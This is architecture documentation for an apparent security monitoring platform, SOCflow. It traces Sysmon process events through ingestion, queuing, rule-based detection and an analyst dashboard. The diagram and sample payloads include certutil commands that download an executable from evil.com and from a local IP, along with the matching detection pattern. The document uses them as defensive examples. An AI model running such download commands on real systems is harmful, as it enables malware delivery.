# SOCflow Data Flow Documentation

This document maps the complete data flow, serialization models, transformational pipelines, and storage lifecycles throughout the **SOCflow** ecosystem.

---

## 1. Complete End-to-End Data Flow Diagram

```
+--------------------------------------------------------------------------------------------------+
| STEP 1: Windows Kernel / Process Creation                                                        |
|   Target executable invoked (e.g. certutil.exe -urlcache -split -f http://evil.com/a.exe)        |
+--------------------------------------------------------------------------------------------------+
                                        │
                                        ▼ (Kernel Event)
+--------------------------------------------------------------------------------------------------+
| STEP 2: Microsoft-Windows-Sysmon                                                                 |
|   Channel: Microsoft-Windows-Sysmon/Operational                                                  |
|   Event ID 1: Process Creation                                                                   |
|   Format: Native Windows Event XML Structure                                                     |
+--------------------------------------------------------------------------------------------------+
                                        │
                                        ▼ (EvtQuery / EvtNext via pywin32)
+--------------------------------------------------------------------------------------------------+
| STEP 3: SOCflow Endpoint Agent (agent_core.py)                                                   |
|   - XML Parsing via xml.etree.ElementTree                                                        |
|   - Key extraction: Image, CommandLine, ParentCommandLine, User, Hashes, ParentImage             |
|   - In-memory buffering (Buffer Threshold: 50 events OR 10 seconds interval)                    |
+--------------------------------------------------------------------------------------------------+
                                        │
                                        ▼ HTTPS POST /api/logs (JSON Payload)
+--------------------------------------------------------------------------------------------------+
| STEP 4: Nginx Reverse Proxy (Port 80/443)                                                        |
|   - SSL/TLS Termination                                                                          |
|   - Path Routing: /api/ -> 127.0.0.1:5001/api/                                                   |
+--------------------------------------------------------------------------------------------------+
                                        │
                                        ▼ HTTP Forwarding
+--------------------------------------------------------------------------------------------------+
| STEP 5: Backend Ingestion API (server.js)                                                        |
|   - Authenticates agent_id token against MySQL `soc_agent` table                                 |
|   - Batch Inserts raw telemetry into MySQL `soc_process_event` table                             |
|   - Obtains assigned event_id primary keys                                                       |
|   - LPUSH JSON payload to Redis queue (`socflow_events_queue`)                                   |
+--------------------------------------------------------------------------------------------------+
                     │                                         │
                     ▼ (Relational Record)                     ▼ (Redis LPUSH)
+-------------------------------------------+    +-------------------------------------------------+
| MySQL Database: `soc_process_event`       |    | Redis In-Memory Queue: `socflow_events_queue`   |
| (Permanent audit record & Log Explorer)   |    | (Decoupled real-time event pipeline)            |
+-------------------------------------------+    +-------------------------------------------------+
                                                                       │
                                                                       ▼ BLPOP (Real-time consumer)
+--------------------------------------------------------------------------------------------------+
| STEP 6: Behavioral Detection Engine (analyzer.py)                                                |
|   - Fetches active rules from `soc_detection_rule`                                               |
|   - Performs regex / keyword matching against command_line and process_name                      |
|   - Evaluates path context, evasion indicators, and parameter weights                            |
|   - Computes Confidence Score (0 - 100) and maps MITRE ATT&CK technique                          |
+--------------------------------------------------------------------------------------------------+
                                        │
                                        ▼
             ┌──────────────────────────┴──────────────────────────┐
             │ Confidence Score >= 40                              │ Confidence Score < 40
             ▼                                                     ▼
+-------------------------------------------+    +-------------------------------------------------+
| Generated Active Alert                    |    | Suppressed Noise Alert                          |
| - Status: `new`                           |    | - Status: `closed` (auto-suppressed)            |
| - Severity: Low / Med / High / Critical   |    | - Reason: "Score below threshold (<40)"         |
| - Written to `soc_alert_reference`        |    | - Written to `soc_alert_reference` for audit    |
+-------------------------------------------+    +-------------------------------------------------+
                     │
                     ▼ Polling / WebSocket / REST query
+--------------------------------------------------------------------------------------------------+
| STEP 7: React SOC Frontend Dashboard (Views / Components)                                        |
|   - Analyst views active incidents in `/alerts` and `/cases`                                     |
|   - Analyst updates status: `new` -> `open` (Logged to `soc_acknowledgement`)                    |
|   - Analyst queries historical events via `/explorer`                                            |
|   - Manager monitors fleet telemetry and modifies rule definitions in `/rules`                   |
+--------------------------------------------------------------------------------------------------+
```

---

## 2. Telemetry Payload Schemas

### 2.1. Endpoint -> Backend Payload (`POST /api/logs`)
```json
{
  "agent_id": "550e8400-e29b-41d4-a716-446655440000",
  "logs": [
    {
      "process_name": "certutil.exe",
      "command_line": "certutil.exe -urlcache -split -f http://192.168.1.100/beacon.exe C:\\Temp\\beacon.exe",
      "parent_process": "cmd.exe",
      "user": "DOMAIN\\victim_user",
      "process_id": 4820,
      "parent_process_id": 2104,
      "executable_path": "C:\\Windows\\System32\\certutil.exe",
      "sha256": "3a7bd3e2360a3d29eea436cdfb27d37feeacab6035460a68200536f9088a8c09",
      "timestamp": "2026-10-15T10:45:00Z"
    }
  ]
}
```

### 2.2. Ingestion API -> Redis Queue Message (`LPUSH socflow_events_queue`)
```json
{
  "event_id": 104291,
  "host_id": 3,
  "agent_id": "550e8400-e29b-41d4-a716-446655440000",
  "process_name": "certutil.exe",
  "command_line": "certutil.exe -urlcache -split -f http://192.168.1.100/beacon.exe C:\\Temp\\beacon.exe",
  "user_name": "DOMAIN\\victim_user",
  "parent_process": "cmd.exe",
  "timestamp": "2026-10-15 10:45:00"
}
```

### 2.3. Detection Engine -> MySQL Alert Record (`INSERT INTO soc_alert_reference`)
```json
{
  "alert_id": 841,
  "event_id": 104291,
  "rule_id": 1,
  "title": "Certutil Remote File Download",
  "severity": "high",
  "confidence_score": 88,
  "status": "new",
  "mitre_technique": "T1105",
  "matched_text": "-urlcache -split -f http://",
  "timestamp": "2026-10-15 10:45:02"
}
```

---

## 3. Storage & Database Schema Relationships

```
+--------------------+        +---------------------+        +--------------------+
| soc_host           |        | soc_agent           |        | soc_process_event  |
+--------------------+        +---------------------+        +--------------------+
| host_id (PK)       |<-------| host_id (FK)        |        | event_id (PK)      |
| hostname           |        | agent_id (PK/UUID)  |<-------| agent_id (FK)      |
| ip_address         |        | shared_secret       |        | host_id (FK)       |
| os_version         |        | last_heartbeat      |        | process_name       |
| status             |        | status              |        | command_line       |
+--------------------+        +---------------------+        | user_name          |
                                                             | timestamp          |
                                                             +--------------------+
                                                                        │
                                                                        │ 1:N
                                                                        ▼
+--------------------+        +---------------------+        +--------------------+
| soc_detection_rule |        | soc_case            |        | soc_alert_reference|
+--------------------+        +---------------------+        +--------------------+
| rule_id (PK)       |<-------+                     |        | alert_id (PK)      |
| name               |        | case_id (PK)        |<---+   | event_id (FK)      |
| mitre_technique    |        | title               |    |   | rule_id (FK)       |
| base_score         |        | status (open/closed)|    |   | severity           |
| pattern            |        | assigned_analyst    |    |   | confidence_score   |
+--------------------+        +---------------------+    |   | status (new/open..) |
                                                         |   +--------------------+
                                                         │              │
                                                         │ N:M          │
                                                         └──────┬───────┘
                                                                ▼
                                                     +---------------------+
                                                     | soc_case_alerts     |
                                                     +---------------------+
                                                     | case_id (FK)        |
                                                     | alert_id (FK)       |
                                                     | linked_at           |
                                                     +---------------------+
```

---

## 4. Latency & Performance Characteristics

* **Ingestion Response Time**: Endpoint HTTP POST to `/api/logs` completes in **< 15ms** (immediate bulk insert and Redis publish).
* **Detection Turnaround**: Detection delay from endpoint execution to alert creation in MySQL is **< 100ms** under standard load.
* **Network Overhead**: Telemetry batches are sent every 10 seconds or 50 events, requiring **< 5 KB** bandwidth per active endpoint cycle.
* **Storage Growth**: Approximately **1.2 KB per process creation event** in MySQL. With 10,000 events/day per endpoint, storage consumption is ~12 MB/day per machine.
